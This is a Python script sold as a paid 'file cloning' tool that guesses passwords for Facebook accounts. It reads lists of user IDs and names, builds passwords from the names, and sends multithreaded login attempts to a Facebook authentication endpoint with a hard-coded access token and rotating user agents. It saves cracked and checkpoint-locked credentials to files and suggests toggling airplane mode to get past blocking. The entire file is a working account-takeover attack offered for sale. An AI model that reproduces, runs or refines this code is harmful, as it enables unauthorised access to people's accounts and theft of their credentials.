import os, requests, json, time, re, random, sys, uuid, string, subprocess, uuid
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup

ses = requests.Session()

id = []
ok = []
cp = []
loop = 0
pwx = []

# -----------------------[ COLOR CODES ]-----------------------#
G = "\033[1;32m"  # Green
W = "\x1b[1;97m"  # White
R = "\x1b[1;31m"  # Red
Y = "\033[1;33m"  # Yellow

# -----------------------[ LOGO ]-----------------------#
os.system('espeak -a 300 "salam, aaliykom ,foor,tool,SPT"')
os.system('espeak -a 300 "well,come to,foor,S, P, T,tools,file,clone, tools"')
logo = f'''
{G}╔══════════════════════════╗
{G}║ {W}███████╗██████╗ ████████╗{G}║
{G}║ {W}██╔════╝██╔══██╗╚══██╔══╝{G}║
{G}║ {W}███████╗██████╔╝   ██║   {G}║
{G}║ {W}╚════██║██╔═══╝    ██║   {G}║
{G}║ {W}███████║██║        ██║   {G}║
{G}╚══════════════════════════╝
{W}{30*'-'}
{G}<{R}•{G}> AUTHOR      : S•P•T
{G}<{R}•{G}> FACEBOOK    : Lhi ndi
{G}<{R}•{G}> GITHUB      : https://github.com/mohadimo
{W}{30*'-'}
{G}<{R}•{G}> VERSION     :  1.0
{G}<{R}•{G}> SERVICE     :  {R}PAID 
{W}{30*'-'}
'''

# -----------------------[ FUNCTION: CLEAR SCREEN ]-----------------------#
def clear():
    os.system("clear")
    print(logo)


# -----------------------[ FUNCTION: USER AGENT ]-----------------------#
def get_random_user_agent():
    ua_list = [
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.4 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Samsung Galaxy S24 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.4 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Xiaomi 14 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.4 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; OnePlus 12R) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.4 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Sony Xperia 1 VI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.4 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Vivo X100 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.4 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Samsung Galaxy Z Fold6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.4 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Huawei P70 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.4 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1"
    ]
    return random.choice(ua_list)

# -----------------------[ FUNCTION: MAIN MENU ]-----------------------#
def main():
    clear()
    print(f"{G}[1] START FILE CLONING")
    print(f"{R}[0] EXIT")
    choice = input(f"{Y}[?] SELECT: {W}")
    if choice == "1":
        file_cloning()
    elif choice == "0":
        exit()
    else:
        print(f"{R}INVALID OPTION! TRY AGAIN.")
        time.sleep(1)
        main()

# -----------------------[ FUNCTION: FILE CLONING ]-----------------------#
def file_cloning():
    clear();print(f'''{G} EXAMPLE : /sdcard/FILE.txt
                                                      ''')
    file_path = input(f"{Y}[?] ENTER FILE PATH: {W}")
    
    try:
        with open(file_path, "r") as file:
            accounts = file.readlines()
    except FileNotFoundError:
        print(f"{R}FILE NOT FOUND! TRY AGAIN.")
        time.sleep(1)
        file_cloning()

    clear()
    try:
        print(f'''{G} BEST : 5 | 7 | 9
                                                      ''')
        pass_limit = int(input(f"{Y}[?] ENTER PASSWORD LIMIT: {W}"))
    except ValueError:
        pass_limit = 5
    clear();print(f'''{G} EXAMPLE : firstlast | first last | first123
                                                      ''')
    passwords = [input(f"{Y}[{i+1}] ENTER PASSWORD: {W}") for i in range(pass_limit)]

    with ThreadPool(max_workers=30) as executor:
        accounts = [acc.strip() for acc in accounts if '|' in acc and acc.strip()]
        print(f"{G}[!] TOTAL ACCOUNTS: {len(accounts)}")
        print(f"{G}[!] IF NO RESULT, TRY ON/OFF AIRPLANE MODE")
        print(W + 47 * "-")
        
        for user in accounts:
            user = user.strip()
            if '|' not in user:
                continue  # تجاهل السطر غير الصحيح
            try:
                user_id, name = user.split("|", 1)
            except ValueError:
                continue
            executor.submit(check_account, user_id, name, passwords)

    print(f"{G}[✓] PROCESS COMPLETED!")
    exit()

# -----------------------[ FUNCTION: CHECK ACCOUNT ]-----------------------#
def check_account(user_id, name, passwords):
    global ok, cp, loop
    first_name = name.split(" ")[0]
    last_name = name.split(" ")[1] if len(name.split(" ")) > 1 else first_name

    for pw in passwords:
        password = pw.replace("first", first_name.lower()).replace("last", last_name.lower())
        session = requests.Session()
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": "graph.facebook.com",
            "User-Agent": get_random_user_agent(),
            "Accept-Encoding": "gzip, deflate",
            "Connection": "Keep-Alive"
        }
    
        data = {
            "adid": str(uuid.uuid4()),
            "device_id": str(uuid.uuid4()),
            "email": user_id,
            "password": password,
            "access_token": "6628568379|c1e620fa708a1d5696fb991c1bde5662",
            "method": "auth.login"
        }
    
        response = session.post("https://api.facebook.com/auth/login", data=data, headers=headers).json()
    
        if "session_key" in response:
            print(f"{G}[OK] {user_id} | {password}")
            ok.append(f"{user_id} | {password}")
            with open("OK_ACCOUNTS.txt", "a") as ok_file:
                ok_file.write(f"{user_id}|{password}\n")
            break
        elif "error_msg" in response and "checkpoint" in response["error_msg"].lower():
            print(f"{Y}[CP] {user_id} | {password}")
            cp.append(f"{user_id} | {password}")
            with open("CP_ACCOUNTS.txt", "a") as cp_file:
                cp_file.write(f"{user_id}|{password}\n")
            break

        # تحديث عدد المحاولات في الوقت الحقيقي
        loop += 1
        sys.stdout.write(f'\r {W}[S•P•T] {loop} | {G}OK{W}/{Y}CP {G}{len(ok)}{W}/{Y}{len(cp)} ')
        sys.stdout.flush()
        
# -----------------------[ FUNCTION: KEY APPROVAL ]-----------------------#
def main_apv():
    os.system('clear')
    ak = "SPT-"
    clear()
    os.system('xdg-open https://chat.whatsapp.com/Elo28LjmJvzL5n6UnU1r0L')

    try:
        key1 = open('/data/data/com.termux/files/usr/bin/.spt-cov', 'r').read()
    except IOError:
        os.system("clear")
        clear()
        print(f'''{G}--------------------------------------------------------------''')
        print(f'''{W}        Your Token Is Not Approved Already''')
        print(f'''{G}--------------------------------------------------------------''')
        print(f'''       THIS TOOL IS PAID

                    7 day→→→→→→→→1$
                   15 day→→→→→→→→2$
                   30 day→→→→→→→→3$ ''')
        print(f'''{G}--------------------------------------------------------------''')
        myid = uuid.uuid4().hex[:10].upper()
        print(f''' {W}          THIS IS YOUR KEY : ''' + ak + myid)
        print(f'''{G}--------------------------------------------------------------''')
        with open('/data/data/com.termux/files/usr/bin/.spt-cov', 'w') as kok:
            kok.write(myid)
        print("")
        print("     Copy Key And Sent Me WhatsApp Approval")
        print(f'''{G}--------------------------------------------------------------''')
        time.sleep(6)
        os.system("xdg-open https://wa.me/+212601279101")
        exit()

    r1 = requests.get("https://github.com/mohadimo/Kay/blob/main/Spt-kay.txt").text
    if key1 in r1:
        main()  # تشغيل القائمة الرئيسية بعد الموافقة
    else:
        os.system("clear")
        os.system('xdg-open https://whatsapp.com/channel/0029Va0pIfL7Noa7wnN8sp13')
        clear()
        print (f'''{G}--------------------------------------------------------------''')
        print(f''' {W}        Your Token Is Not Approved''')
        print(f'''{G}--------------------------------------------------------------''')
        print(f'''{W}       THIS TOOL IS PAID

                    7 day→→→→→→→→1$
                   15 day→→→→→→→→2$
                   30 day→→→→→→→→3$ ''')
        print(f'''{G}--------------------------------------------------------------''')
        print(f'''{W}          YOUR KEY : ''' + ak + key1)
        print(f'''{G}--------------------------------------------------------------''')
        print(f'''{W}        Copy Key And Sent Me WhatsApp Approval''')
        print(f'''{G}--------------------------------------------------------------''')
        time.sleep(3.5)
        os.system("xdg-open https://wa.me/+212601279101")
        exit()

# -----------------------[ RUN SCRIPT ]-----------------------#
oks, cps = [], []
if __name__ == "__main__":
    try:
        main_apv() 
    except requests.exceptions.ConnectionError:
        print(f"{R}NETWORK ERROR! CHECK YOUR INTERNET CONNECTION.")
        exit()
    except Exception as e:
        print(f"{R}ERROR: {str(e)}")
        exit()